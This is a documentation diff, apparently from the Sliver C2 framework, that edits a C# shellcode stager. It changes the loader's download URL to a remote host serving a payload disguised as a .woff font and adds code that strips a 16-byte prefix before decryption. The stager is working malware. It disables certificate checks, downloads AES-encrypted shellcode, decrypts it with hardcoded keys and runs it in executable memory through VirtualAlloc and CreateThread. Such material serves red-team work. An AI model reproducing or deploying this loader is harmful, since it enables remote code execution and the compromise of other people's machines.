@@ -144,7 +144,9 @@ If aes-encrypt-iv is not set it defaults to `0000000000000000`. After the stage 
 
 ```csharp
 using System;
+using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
@@ -156,7 +158,7 @@ namespace Sliver_stager
     {
         private static string AESKey = "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT";
         private static string AESIV = "8y/B?E(G+KbPeShV";
-        private static string url = "http://192.168.0.52/test.woff";
+        private static string url = "http://192.168.24.128:8443/test.woff";
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
@@ -172,9 +174,20 @@ namespace Sliver_stager
             ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
             System.Net.WebClient client = new System.Net.WebClient();
             byte[] shellcode = client.DownloadData(url);
-            shellcode = Decrypt(shellcode, AESKey, AESIV);
-            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
-            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+
+            List<byte> l = new List<byte> { };   
+
+            for (int i = 16; i <= shellcode.Length -1; i++) {
+                l.Add(shellcode[i]);
+            }
+
+            byte[] actual = l.ToArray();
+
+            byte[] decrypted;
+
+            decrypted = Decrypt(actual, AESKey, AESIV);
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decrypted.Length, 0x3000, 0x40);
+            Marshal.Copy(decrypted, 0, addr, decrypted.Length);
             IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
             WaitForSingleObject(hThread, 0xFFFFFFFF);
             return;
